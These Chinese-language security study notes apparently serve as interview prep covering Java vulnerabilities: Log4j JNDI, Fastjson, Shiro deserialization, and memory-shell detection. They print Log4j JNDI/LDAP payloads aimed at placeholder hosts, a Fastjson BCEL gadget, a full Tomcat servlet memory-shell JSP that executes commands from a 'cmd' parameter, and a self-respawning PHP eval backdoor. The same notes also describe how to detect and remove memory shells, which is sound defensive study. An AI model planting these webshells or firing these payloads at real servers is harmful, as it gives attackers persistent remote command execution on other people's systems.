# hvv_Java


# java

### 代码审计漏洞

[java代码审计 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7945#toc-15)

### java实现RCE的函数

Runtime.getRuntime.exec("cmd")

new ProcessBuilder().start("cmd")

### Log4J漏洞有深入了解吗？

再正常的log处理过程中会对`${`内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因,

**特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令

```
${jndi:ldap://xxx.xxx.xxx.xxx/exp}
第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址

第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令
```

```
${jndi:ldap://${sys:java.version}.collaborator.com}
```

![image-20230723184917478](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230723184917478.png)

#### ladp注入原理

1.使用了lookup
2.lookup的参数动态可控
3.构建一个ldap服务，指定远程加载地址为恶意代码地址
4.在客户端访问ldap服务不存在的对象
5.客户端下载恶意代码到本地并执行

#### rmi具体过程

 远端方法调用（Remote Method Invocation）

![image-20230723191351812](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230723191351812.png)

1. Server端监听一个端口，这个端口是JVM随机选择的；
2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；
3. Client端可以调用Stub上的方法；
4. Stub连接到Server端监听的通信端口并提交参数；
5. 远程Server端上执行具体的方法，并返回结果给Stub；
6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；

### 讲一下fastjson

Fastjson提供了autotype功能再处理json的时候,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型，没有对指定恶意代码Class的@Type，
 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码 ,远程连接rmi主机，反弹shell之类的操作

```
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

### cc链的4种transformer

[CC链 1-7 分析 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9409)

### shrio反序列化

Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie，在服务端接收cookie值后，Base64解码–>AES解密–>反序列化。攻击者只要找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化–>AES加密–>Base64编码，然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。
Shiro < 1.2.4版本会存在此漏洞，挖掘的时候删除请求包中的rememberMe参数，返回包中包含rememberMe=deleteMe字段。说明使用了shiro组件，可以尝试此漏洞。
如果返回包无此字段，可以通过在发送数据包的cookie中增加字段：****rememberMe=，然后查看返回数据包中是否存在关键字
此漏洞有两个版本利用方式，
**SHIRO-550：**
不需要提供秘钥，使用默认秘钥就可以利用
**SHIRO-721:**
先爆破秘钥，成功后可以进一步利用

### spring漏洞

![image-20220613205748112](https://alious-1314078558.cos.ap-beijing.myqcloud.com/cf334a87559e5c0fe4c7c97b899319de.png)

### java执行无回显

dnslog、当前环境中找响应对象、抛出异常、web目录里写入html

[Java 反序列化回显的多种姿势 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/7740)

### 内存马查杀

### 内存马的分类

1. servlet-api类
   - filter型
   - servlet型
2. spring类
   - 拦截器
   - controller型
3. java Instrumentation类
   - agent型

#### filter内存马

1. 创建一个恶意 Filter
2. 利用 FilterDef 对 Filter 进行一个封装
3. 将 FilterDef 添加到 FilterDefs 和 FilterConfig
4. 创建 FilterMap ，将我们的 Filter 和 urlpattern 相对应，存放到 filterMaps中（由于 Filter 生效会有一个先后顺序，所以我们一般都是放在最前面，让我们的 Filter 最先触发）

### 查杀思路

利用java agent技术遍历所有已经加载到内存中的class,先判断是否是内存马,是则进入内存查杀

### 内存马的识别

#### filter名字很特别

内存马的filter名一般比较特别,有shell或者随机数等关键字.这个特征较弱,因为这取决于内存马的构造者的习惯,构造完全可以设置一个看起来很正常的名字

#### filter优先级是第一位

为了确保内存马在各种环境下都可以访问,往往需要把filter匹配优先级调至最高,这在shiro反序列化中是刚需.但是在其他场景之下就非必须,之能作为一个可疑点

#### 对比web.xml中没有filter配置

由于内存马的filter是动态注册的,所以在web.xml中肯定没有配置,这个是个可以的特征.但servlet 3.0引入了@WebFiler标签方便开发这个动态注册filter.这种情况也存在没有在web.xml中显式声明,这个特征可以作为较强的特征.

#### 特殊class loader加载

我们都知道filter也是class,也是必须有特定的class loader加载.正常的filter都是由中间件的webappclassloader加载的.反序列化漏洞喜欢利用Templatesimpl和bcel执行任意代码.所以这些class往往就是下面这两个

```
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader
com.sun.org.apache.bcel.internal.util.ClassLoader
```

这个特征是一个特别可疑的点.有的内存马还是比较狡猾的,他会注入class到当前线程中,然后实例化注入内存马.这个时候内存马就有可能不是上面的两个classloader

#### 对应的classloader路径下面没有class文件

所谓内存马就是代码驻留在内存中,本地无对应的class文件,所以我们只要检测filter对应的classloader目录下是否存在class文件

#### dilter的dofilter方法中有恶意代码

我们可把内存中所有的filter的class dump出来,使用fernflower等反编译工具分析看看,是否存在恶意代码,，比如调用了如下可疑的方法：

```
java.lang.Runtime.getRuntime
defineClass
invoke
…
```

总的来讲这两类,也就是说filter型内存马首先是一个filter类,同时它在硬盘上没有对应的class文件。若dump出的class还有恶意代码，那是内存马无疑啦 

检查思路抽象如下

```java
 private static boolean isMemshell(Class targetClass,byte[] targetClassByte){
    ClassLoader classLoader = null;
    if(targetClass.getClassLoader() != null) {
        classLoader = targetClass.getClassLoader();
    }else{
        classLoader = Thread.currentThread().getContextClassLoader();
    }

    Class clsFilter =  null;
    try {
        clsFilter = classLoader.loadClass("javax.servlet.Filter");
    }catch (Exception e){
    }

    // 是否是filter
    if(clsFilter != null && clsFilter.isAssignableFrom(targetClass)){
        // class loader 是不是Templates或bcel
        if(classLoader.getClass().getName().contains("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader")
                || classLoader.getClass().getName().contains("com.sun.org.apache.bcel.internal.util.ClassLoader")){
            return true;
        }

        // 是否存在ClassLoader的文件目录下存在对应的class文件
        if(classFileIsExists(targetClass)){
            return true;
        }
        
        // filter是否包含恶意代码。
        String[] blacklist = new String[]{"getRuntime","defineClass","invoke"};
        String clsJavaCode = FernflowerUtils.decomper(targetClass,targetClassByte);
        for(String b:blacklist){
            if(clsJavaCode.contains(b)){
                return true;
            }
        }
    }else{
        return false;
    }
    return false;
}
```

### 内存马的查杀

#### 清除内存马中的filter的恶意代码

#### 模拟中间件注销filter

两种方法各有优劣，第一种方法比较通用，直接适配所有中间件。但恶意Filter依然在，只是恶意代码被清除了。第二种方法比较优雅，恶意Filter会被清除掉。但每种中间件注销Filter的逻辑不尽相同，需要一一适配

https://gv7.me/articles/2020/kill-java-web-filter-memshell/

[Tomcat 内存马学习(一)：Filter型 (qq.com)](**内存马**，也称**无文件马**，是**无文件攻击**的一种常用手段。





## 0x0 基础知识

### Servlet

Servlet是运行在web服务器或应用服务器上的程序，它是作为来自HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。
**1.请求的处理过程**
客户端发起一个http请求，比如get类型。
Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest和HttpServletResponse对象。
Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。
Servlet容器调用service()方法。
service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。
doXXX方法中是我们自己写的业务逻辑。
业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。
容器关闭时候，会调用destory方法。
**2.servlet生命周期**
1）服务器启动时(web.xml中配置load-on-startup=1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(SerlvetConfig conf)。
2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行
3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。
4）由JVM进行垃圾回收。

### Filter

filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。

### Listener

JavaWeb开发中的监听器(Listener)就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行的功能组件。

**ServletContextListener：**对Servlet上下文的创建和销毁进行监听；
**ServletContextAttributeListener：**监听Servlet上下文属性的添加、删除和替换；

**HttpSessionListener：**对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。

**HttpSessionAttributeListener：**对Session对象中属性的添加、删除和替换进行监听；

**ServletRequestListener：**对请求对象的初始化和销毁进行监听；
**ServletRequestAttributeListener：**对请求对象属性的添加、删除和替换进行监听。

**用途**
可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。

### Tomcat

简单理解，tomcat是http服务器+servlet容器。
Tomcat作为Servlet容器，将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，传递给servlet；同时会将相应的信息封装为HttpServletRequesponse类型的response对象，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器。

## 0x1 webshell变迁

web服务端管理页面→大马→小马拉大马→一句话木马→加密一句话木马→加密内存马

![image-20230716221019089](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230716221019089.png)

## 0x2 如何实现webshell内存马

**目标：**访问任意url或者url，带上命令执行参数，即可让服务器返回命令执行结果。
**实现：**以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。

![image-20230716221204651](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230716221204651.png)

## 0x3 内存马攻击原理

通过动态注册一个新的Filter或者向Filter中注入恶意的shellcode，让Filter允许攻击者访问到web服务器内存中的数据。主要拥有了可用的Filter，攻击者就能进行远程攻击，而不管是shellcode的注入过程还是对web服务器数据进行访问的过程都会在内存中出现异常行为。另外，由于web服务器在网络中与数据库和权限系统连接，攻击者在入侵后，可以更轻易地进行横向的渗透，拿到多个主机的权限。

## 0x4 内存马实现

这里是以tomcat的servletAPI型内存马为例讲一下内存马的实现。
下面代码先是创建了一个恶意的servlet，然后获取当前的StandardContext，然后将恶意servlet封装成wrapper添加到Standard Context当中，最后添加ServletMapping将访问的URL和wrapper进行绑定。

```JAVA
<%@ page import="java.ip.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.printWriter" %>
```

```JAVA
<%
    // 创建恶意Servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
        @Override
        public void service(ServletRequest servletRequest,ServletResponse servletResponse) throws ServletException,IOException{
            String cmd = servletRequest.getParameter("cmd");
            boolean is Linux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh","-c",cmd} : new String[]{"cmd.exe","/c",cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
        @Override
        public String getServletInfo() {
            return null;
        }
        @Override
        public void destroy() {
        }
};
%>
<%
    // 获取StandardContext
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
    StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
    // 用Wrapper对其进行封装
    org.apache.catalina.Wrapper newWrapper = standardCtx.createWrapper();
    newWrapper.setName("jweny");
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    newWrapper.setServletClass(servlet.getClass().getName());
    // 添加封装后的恶意Wrapper到StandardContext的children当中
    standardCtx.addChild(newWrapper);
    // 添加ServletMapping将访问的URL和Servlet进行绑定
    standardCtx.addServletMapping("/shell","jweny");
%>
```

执行上述代码后，访问当前应用的/shell路径，加上cmd参数就可以命令执行了。使用新增servlet的方式就需要绑定指定的URL。如果我们想要更加隐蔽，做到内存马与URL无关，无论这个url是原生servlet还是某个struts action，甚至无论这个url是否真的存在，只要我们的请求传递给tomcat，tomcat就能相应我们的指令，那就得通过注入新的或修改已有的filter或者listener的方式来实现了。

## 0x5 内存马查杀

**方法一：**清除内存马中的Filter的恶意代码。这种方式相对通用简单一些，直接适配所有中间件。
**方法二：**模拟中间件注销Filter。这种方式相对要复杂一些，因为每种中间件注销Filter的逻辑不尽相同，需要一一适配。

## 0x6 内存马实例

```php
<?php
set_time_limit(0);      //set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0，没有时间方面的限制。
ignore_user_abort(1);   //ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为true，则忽略与用户的断开。
unlink(__FILE__);       //unlink(__FILE__)函数：删除文件。
while(1){
    $content = '<?php @eval($_POST["geek"])?>';
    file_put_contents("22.php",$content);   //file_put_contents函数：将一个字符串写入文件。
    usleep(10000);                          //usleep函数：延迟执行当前脚本若干微妙
}
?>
```

将php不死马放到web目录下，
访问代码执行成功生成后门

![image-20230716222108617](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230716222108617.png)

对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。使用条件竞争写入同名文件进行克制不死马。
将usleep改为小于php不死马的参数，查看22.php已修改成叹号。



参考资料：

[黑客攻击之道---内存马](https://www.kancloud.cn/geekfar/love/2601039#11_webshell_5)


